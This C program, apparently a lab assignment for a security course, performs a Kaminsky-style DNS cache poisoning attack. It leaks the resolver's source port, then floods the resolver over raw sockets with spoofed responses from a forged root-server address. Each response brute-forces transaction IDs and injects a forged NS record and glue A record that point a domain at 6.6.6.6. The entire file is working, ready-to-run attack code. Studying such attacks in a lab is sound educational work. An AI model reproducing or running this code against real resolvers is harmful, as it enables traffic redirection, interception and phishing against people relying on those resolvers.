#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ldns/ldns.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define SERVER_IP "192.168.1.201"
#define RESOLVER_IP "192.168.1.203"
#define ROOT_IP "192.168.1.204"
#define DNS_PORT 53
#define SERVER_PORT 6666
#define TARGET_DOMAIN "www.attacker.cybercourse.example.com"
#define POISON_TARGET_DOMAIN "www.example1.cybercourse.example.com"
#define POISON_IP "6.6.6.6"
#define MAX_ROUNDS 1000
#define TID_ATTEMPTS 500
#define TTL_TIME 300
#define DUMMY_IP "1.2.3.4"
#define NS_RECORD_OWNER "example1.cybercourse.example.com"

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return (unsigned short)answer;
}

void send_nudge() {
    // Start UDP socket to connect with resolver
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        exit(EXIT_FAILURE);
    }

    // Create resolver address struct
    struct sockaddr_in res_addr;
    memset(&res_addr, 0, sizeof(res_addr));
    res_addr.sin_family = AF_INET;
    res_addr.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, RESOLVER_IP, &res_addr.sin_addr);

    // Create the packet for querry to resolver
    ldns_pkt *query_pkt = ldns_pkt_query_new(
        ldns_dname_new_frm_str(TARGET_DOMAIN),
        LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);

    if (!query_pkt) {
        close(sock);
        exit(EXIT_FAILURE);
    }

    // flatten the packet to be ready to sent
    uint8_t *data = NULL;
    size_t data_size = 0;
    ldns_pkt2wire(&data, query_pkt, &data_size);

    sendto(sock, data, data_size, 0, (struct sockaddr*)&res_addr, sizeof(res_addr));
    ldns_pkt_free(query_pkt);
    free(data);
    close(sock);
}

uint16_t leak_port() {
    // Creating TCP connection to server
    int client_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (client_sock < 0) {
        exit(EXIT_FAILURE);
    }
    // Create server address struct
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    if (connect(client_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(client_sock);
        exit(EXIT_FAILURE);
    }

    send_nudge();
    // Getting answer from server
    uint16_t net_port;
    long bytes = recv(client_sock, &net_port, sizeof(net_port), 0);
    if (bytes <= 0) {
        close(client_sock);
        exit(EXIT_FAILURE);
    }
    // Converting big endian bytes to little endian
    return ntohs(net_port);
}

void run_kaminsky_attack(uint16_t leaked_port) {

    int raw_sock;
    char subdomain_name[256];
    char packet_buffer[4096];

    // Initialize random seed
    srand((unsigned int)time(NULL));

    struct iphdr *ip = (struct iphdr *)packet_buffer;
    struct udphdr *udp = (struct udphdr *)(packet_buffer + sizeof(struct iphdr));
    uint8_t *dns_payload_ptr = (uint8_t *)(packet_buffer + sizeof(struct iphdr) + sizeof(struct udphdr));

    if ((raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        exit(EXIT_FAILURE);
    }

    // Take responsibility for manually setting the headers
    int opt = 1;
    setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    // Create resolver address with leaked port struct
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(leaked_port);
    inet_pton(AF_INET, RESOLVER_IP, &dest_addr.sin_addr);

    // For every round attack with new domain - Kaminski loop
    for (int round = 0; round < MAX_ROUNDS; round++) {
        snprintf(subdomain_name, sizeof(subdomain_name), "ww%d.%s", round, POISON_TARGET_DOMAIN);

        // Create UDP socket for querry
        int q_sock = socket(AF_INET, SOCK_DGRAM, 0);
        struct sockaddr_in res_addr;
        memset(&res_addr, 0, sizeof(res_addr));
        res_addr.sin_family = AF_INET; res_addr.sin_port = htons(DNS_PORT);
        inet_pton(AF_INET, RESOLVER_IP, &res_addr.sin_addr);

        // Create DNS querry packet
        ldns_pkt *q_pkt = ldns_pkt_query_new(
            ldns_dname_new_frm_str(subdomain_name),
            LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);

        if (!q_pkt) {
            close(q_sock);
            continue;
        }

        // flatten the packet to be ready to sent
        uint8_t *q_wire = NULL;
        size_t q_size = 0;
        ldns_pkt2wire(&q_wire, q_pkt, &q_size);
        sendto(q_sock, q_wire, q_size, 0, (struct sockaddr*)&res_addr, sizeof(res_addr));
        close(q_sock);
        ldns_pkt_free(q_pkt);
        free(q_wire);

        // Create DNS fake response packet
        ldns_pkt *resp_pkt = ldns_pkt_query_new(
            ldns_dname_new_frm_str(subdomain_name),
            LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
        if (!resp_pkt) {
            continue;
        }
        // Response query flag
        ldns_pkt_set_qr(resp_pkt, 1);
        // Official source flag (authority answer)
        ldns_pkt_set_aa(resp_pkt, 1);
        // Handle the query recursively flag
        ldns_pkt_set_rd(resp_pkt, 1);
        // According to file pdf set to 0 when sending query
        ldns_pkt_set_ra(resp_pkt, 0);

        // Create fake Answer section
        ldns_rr *ans_rr = ldns_rr_new();
        ldns_rr_set_owner(ans_rr, ldns_dname_new_frm_str(subdomain_name));
        ldns_rr_set_ttl(ans_rr, TTL_TIME);
        ldns_rr_set_type(ans_rr, LDNS_RR_TYPE_A);
        ldns_rr_set_class(ans_rr, LDNS_RR_CLASS_IN);
        ldns_rdf *ans_rdata = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, DUMMY_IP);
        ldns_rr_push_rdf(ans_rr, ans_rdata);
        ldns_pkt_push_rr(resp_pkt, LDNS_SECTION_ANSWER, ans_rr);

        // Authority section
        ldns_rr *ns_rr = ldns_rr_new();
        ldns_rr_set_owner(ns_rr, ldns_dname_new_frm_str(NS_RECORD_OWNER));
        ldns_rr_set_ttl(ns_rr, TTL_TIME);
        ldns_rr_set_type(ns_rr, LDNS_RR_TYPE_NS);
        ldns_rr_set_class(ns_rr, LDNS_RR_CLASS_IN);
        ldns_rdf *ns_rdata = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, POISON_TARGET_DOMAIN);
        ldns_rr_push_rdf(ns_rr, ns_rdata);
        ldns_pkt_push_rr(resp_pkt, LDNS_SECTION_AUTHORITY, ns_rr);

        // Additional section - the poisoning
        ldns_rr *glue_rr = ldns_rr_new();
        ldns_rr_set_owner(glue_rr, ldns_dname_new_frm_str(POISON_TARGET_DOMAIN));
        ldns_rr_set_ttl(glue_rr, TTL_TIME);
        ldns_rr_set_type(glue_rr, LDNS_RR_TYPE_A);
        ldns_rr_set_class(glue_rr, LDNS_RR_CLASS_IN);
        ldns_rdf *glue_ip = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, POISON_IP);
        ldns_rr_push_rdf(glue_rr, glue_ip);
        ldns_pkt_push_rr(resp_pkt, LDNS_SECTION_ADDITIONAL, glue_rr);

        // Convert to Wire format
        uint8_t *dns_payload = NULL; size_t dns_payload_len = 0;
        if (ldns_pkt2wire(&dns_payload, resp_pkt, &dns_payload_len) != LDNS_STATUS_OK) {
            ldns_pkt_free(resp_pkt);
            continue;
        }

        // 3. Set headers
        memset(packet_buffer, 0, 4096);
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = htons((uint16_t)(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_len));
        ip->id = htons(54321);
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(ROOT_IP);
        ip->daddr = inet_addr(RESOLVER_IP);
        ip->check = csum((unsigned short *)packet_buffer, sizeof(struct iphdr));
        udp->source = htons(DNS_PORT);
        udp->dest = htons(leaked_port);
        udp->len = htons((uint16_t)(sizeof(struct udphdr) + dns_payload_len));
        memcpy(dns_payload_ptr, dns_payload, dns_payload_len);

        // Random TXID
        uint16_t start_tid = (uint16_t)(rand() % 65536);
        for (int i = 0; i < TID_ATTEMPTS; i++) {
            uint16_t guess_tid = (uint16_t)(start_tid + i);
            uint16_t net_tid = htons(guess_tid);
            memcpy(dns_payload_ptr, &net_tid, 2);
            udp->check = 0;

            struct pseudo_header psh;
            psh.source_address = inet_addr(ROOT_IP);
            psh.dest_address = inet_addr(RESOLVER_IP);
            psh.placeholder = 0;
            psh.protocol = IPPROTO_UDP;
            psh.udp_length = htons((uint16_t)(sizeof(struct udphdr) + dns_payload_len));

            int psize = (int)(sizeof(struct pseudo_header) + sizeof(struct udphdr) + dns_payload_len);
            char *pseudogram = malloc((size_t)psize);
            if (pseudogram) {
                memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header), udp, sizeof(struct udphdr) + dns_payload_len);
                udp->check = csum((unsigned short*)pseudogram, psize);
                free(pseudogram);
            }
            sendto(raw_sock, packet_buffer, ntohs(ip->tot_len), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        }
        ldns_pkt_free(resp_pkt); free(dns_payload);
        usleep(5000);
    }
    close(raw_sock);
}


int main() {
    uint16_t data = leak_port();
    run_kaminsky_attack(data);
    return 0;
}